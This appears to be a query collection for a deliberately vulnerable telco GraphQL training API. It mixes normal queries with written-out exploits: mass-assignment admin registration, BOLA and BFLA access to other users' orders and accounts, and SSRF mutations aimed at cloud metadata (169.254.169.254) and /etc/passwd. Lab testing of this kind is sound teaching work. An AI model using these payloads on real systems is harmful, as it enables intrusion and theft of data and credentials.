# GraphQL Query Collection for Telco Vulnerable API

This file contains sample queries and mutations for testing the GraphQL API.
Use these with GraphQL Playground, Apollo Studio, Insomnia, or any GraphQL client.

## Authentication Mutations

### Register a New User
```graphql
mutation RegisterUser {
  register(input: {
    username: "newuser"
    password: "password123"
    email: "newuser@example.com"
    isAdmin: false
  }) {
    message
    user {
      customerId
      username
      email
      isAdmin
    }
  }
}
```

### Register with Admin Privilege (Mass Assignment Vulnerability)
```graphql
mutation RegisterAdmin {
  register(input: {
    username: "hacker"
    password: "hacked"
    email: "hacker@evil.com"
    isAdmin: true  # Should be blocked but isn't
  }) {
    message
    user {
      customerId
      username
      isAdmin
    }
  }
}
```

### Login
```graphql
mutation Login {
  login(input: {
    username: "username"
    password: "password"
  }) {
    token
    message
    user {
      customerId
      username
      email
      isAdmin
    }
  }
}
```

## User Queries (Requires Authentication)

### Get Current User
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query GetMe {
  me {
    customerId
    username
    email
    isAdmin
  }
}
```

### Delete User (BFLA Vulnerability)
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation DeleteAnyUser {
  deleteUser(username: "username2") {
    message
    success
  }
}
```

## Order Mutations and Queries

### Create Order
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation CreateOrder {
  createOrder(input: {
    productId: "PROD-MOBILE-5G"
    quantity: 2
    customerId: "CUSTOMER_ID_HERE"
  }) {
    orderId
    productId
    quantity
    customerId
    status
    orderDate
  }
}
```

### Get Orders (BOLA Vulnerability - Access Other User's Orders)
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query GetOtherUsersOrders {
  orders(customerId: "OTHER_CUSTOMER_ID") {
    orderId
    productId
    quantity
    customerId
    status
    orderDate
  }
}
```

### Get All Orders Without Filter
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query GetAllOrders {
  orders {
    orderId
    productId
    quantity
    customerId
    status
    orderDate
  }
}
```

### Get Single Order
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query GetOrder {
  order(orderId: "ORDER_ID_HERE") {
    orderId
    productId
    quantity
    customerId
    status
    orderDate
  }
}
```

### Update Order (Mass Assignment Vulnerability)
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation UpdateOrderExploit {
  updateOrder(
    orderId: "ORDER_ID_HERE"
    input: {
      quantity: 999
      status: completed  # Changing status without authorization
    }
  ) {
    orderId
    productId
    quantity
    status
    orderDate
  }
}
```

### Cancel Order
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation CancelOrder {
  cancelOrder(orderId: "ORDER_ID_HERE") {
    message
    success
  }
}
```

## Product Order Mutations and Queries

### Create Product Order
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation CreateProductOrder {
  createProductOrder(input: {
    description: "5G Mobile Plan Subscription"
    priority: "1"
    category: "mobile"
    state: "acknowledged"
    relatedParty: [{
      id: "CUSTOMER_ID_HERE"
      role: "customer"
    }]
    productOrderItem: [{
      id: "item-001"
      action: "add"
      quantity: 1
      product: {
        id: "PROD-5G-UNLIMITED"
        name: "5G Unlimited Plan"
      }
    }]
    orderTotalPrice: [{
      priceType: "recurring"
      price: {
        taxIncludedAmount: 59.99
        dutyFreeAmount: 49.99
        taxRate: 0.20
        currencyCode: "USD"
      }
    }]
    billingAccount: {
      id: "BA-12345"
      name: "Primary Billing Account"
    }
    note: [{
      author: "system"
      text: "Auto-generated order"
    }]
  }) {
    orderId
    state
    description
    priority
    category
    relatedParty {
      id
      role
    }
    productOrderItem {
      id
      action
      quantity
      product {
        id
        name
      }
    }
  }
}
```

### Get Product Orders (BOLA Vulnerability)
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query GetProductOrders {
  productOrders(customerId: "ANY_CUSTOMER_ID") {
    orderId
    state
    description
    priority
    category
    orderDate
    relatedParty {
      id
      role
    }
  }
}
```

### Get Single Product Order
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query GetProductOrder {
  productOrder(orderId: "ORDER_ID_HERE") {
    orderId
    state
    requestedStartDate
    requestedCompletionDate
    description
    priority
    category
    relatedParty {
      id
      role
    }
    productOrderItem {
      id
      action
      quantity
      product {
        id
        name
      }
    }
    orderTotalPrice {
      priceType
      price {
        taxIncludedAmount
        currencyCode
      }
    }
  }
}
```

### Update Product Order (Mass Assignment Vulnerability)
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation UpdateProductOrderExploit {
  updateProductOrder(
    orderId: "ORDER_ID_HERE"
    input: {
      state: "completed"  # Changing state without proper authorization
      priority: "0"  # Escalating priority
      description: "Modified by unauthorized user"
    }
  ) {
    orderId
    state
    priority
    description
  }
}
```

### Delete Product Order
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation DeleteProductOrder {
  deleteProductOrder(orderId: "ORDER_ID_HERE") {
    message
    success
  }
}
```

## Webhook Mutation (SSRF Vulnerability)

### Trigger Webhook - Internal Network Access
```graphql
mutation SSRFExploitInternal {
  triggerWebhook(url: "http://localhost:27017") {
    message
    data
  }
}
```

### Trigger Webhook - Cloud Metadata
```graphql
mutation SSRFExploitCloud {
  triggerWebhook(url: "http://169.254.169.254/latest/meta-data/") {
    message
    data
  }
}
```

### Trigger Webhook - File Protocol (if supported)
```graphql
mutation SSRFExploitFile {
  triggerWebhook(url: "file:///etc/passwd") {
    message
    data
  }
}
```

## Introspection Queries

### Full Schema Introspection
```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        description
        type {
          name
          kind
        }
      }
    }
    queryType {
      name
      fields {
        name
        description
      }
    }
    mutationType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

### List All Queries
```graphql
query ListQueries {
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### List All Mutations
```graphql
query ListMutations {
  __schema {
    mutationType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

## Batch Query Examples (No Rate Limiting)

### Query Multiple Endpoints Simultaneously
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
query BatchQuery {
  me {
    username
    isAdmin
  }
  orders {
    orderId
    status
  }
  productOrders {
    orderId
    state
  }
}
```

### Multiple Mutations in One Request
**Headers**: `{ "Authorization": "Bearer YOUR_TOKEN" }`
```graphql
mutation BatchMutations {
  order1: createOrder(input: {
    productId: "PROD-1"
    quantity: 1
    customerId: "CUSTOMER_ID"
  }) {
    orderId
  }
  order2: createOrder(input: {
    productId: "PROD-2"
    quantity: 2
    customerId: "CUSTOMER_ID"
  }) {
    orderId
  }
  order3: createOrder(input: {
    productId: "PROD-3"
    quantity: 3
    customerId: "CUSTOMER_ID"
  }) {
    orderId
  }
}
```

## Complex Nested Query (Query Depth Attack)
```graphql
query DeepQuery {
  orders {
    orderId
    customerId
    status
    productId
    quantity
    orderDate
  }
}
```

---

## Testing Workflow

1. **Register** a new user or use default credentials
2. **Login** to get JWT token
3. **Set Authorization header** in your GraphQL client: `Bearer <token>`
4. **Execute queries/mutations** to test functionality and vulnerabilities
5. **Try exploitation scenarios**:
   - Access other users' orders (BOLA)
   - Modify protected fields (Mass Assignment)
   - Delete users without proper authorization (BFLA)
   - Trigger internal requests (SSRF)
   - Enumerate schema (Introspection)

## Notes

- Replace `YOUR_TOKEN`, `ORDER_ID_HERE`, `CUSTOMER_ID_HERE` with actual values
- All vulnerabilities are intentional for educational purposes
- The API uses HTTPS with self-signed certificates - accept certificate warnings
